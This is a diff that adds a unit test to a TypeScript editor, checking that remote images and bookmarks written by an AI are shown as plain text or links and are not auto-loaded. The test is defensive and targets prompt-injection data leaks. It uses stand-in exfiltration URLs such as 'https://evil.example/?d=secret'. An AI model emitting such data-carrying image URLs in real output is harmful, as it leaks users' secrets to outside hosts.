@@ -1,6 +1,6 @@
 import assert from "node:assert/strict";
 import test from "node:test";
-import { aiMarkdownToBlocks, blocksToAIMarkdown, cleanAIMarkdown, linkCitations, shrinkWarning } from "./ai-markdown";
+import { aiMarkdownToBlocks, blocksToAIMarkdown, cleanAIMarkdown, linkCitations, markdownImageUrls, shrinkWarning } from "./ai-markdown";
 
 const text = (t: string) => [{ type: "text", text: t, styles: {} }];
 /** 테스트용: 블록 종류와 글만 적는다 */
@@ -72,4 +72,32 @@ test("linkCitations: only real sources outside code become cite links", () => {
   assert.equal(linkCitations("[1](https://a.b) [1]: ref", sources), "[1](https://a.b) [1]: ref");
   assert.equal(linkCitations("streaming ```\ncode [1]", sources), "streaming ```\ncode [1]", "unclosed fence while streaming");
   assert.equal(linkCitations("[1]", new Set()), "[1]");
+});
+
+test("aiMarkdownToBlocks: AI-written remote images and new bookmarks never auto-load", () => {
+  // 실제 변환기처럼 ![](...) 를 이미지 블록으로 만드는 가짜 parse
+  const parseWithImages = (md: string) =>
+    md.split(/\n{2,}/).map((chunk) => {
+      const image = chunk.match(/^!\[([^\]]*)\]\(([^)]+)\)$/);
+      return image ? { type: "image", props: { url: image[2], caption: image[1] } } : { type: "paragraph", content: text(chunk) };
+    });
+  const answer = "![내 사진](https://cdn.example/me.png)\n\n![](https://evil.example/?d=secret)\n\nhttps://evil.example/?d=secret2";
+  const own = markdownImageUrls("before ![내 사진](https://cdn.example/me.png) after");
+  assert.deepEqual([...own], ["https://cdn.example/me.png"]);
+  assert.deepEqual(
+    [...markdownImageUrls('<figure><img alt="a.png" src="http://h/uploads/a.png?x=1&amp;y=2"><figcaption>c</figcaption></figure>')],
+    ["http://h/uploads/a.png?x=1&y=2"],
+    "captioned images are serialized as HTML",
+  );
+
+  const blocks = aiMarkdownToBlocks(answer, parseWithImages, new Map(), own);
+  assert.equal(blocks[0].type, "image", "image that was already in the edited text is kept");
+  assert.equal(blocks[1].type, "paragraph");
+  assert.match(blocks[1].content[0].text, /🖼 이미지 \(https:\/\/evil\.example/);
+  assert.equal(blocks[2].type, "paragraph", "new bookmark becomes a plain link (no server-side preview fetch)");
+  assert.equal(blocks[2].content[0].type, "link");
+
+  const inserted = aiMarkdownToBlocks(answer, parseWithImages);
+  assert.ok(!inserted.some((b) => b.type === "image" || b.type === "bookmark"), "insert: nothing loads automatically");
+  assert.equal(aiMarkdownToBlocks("https://youtu.be/abcdefghijk", parseWithImages)[0].type, "embed", "allow-listed embeds stay");
 });
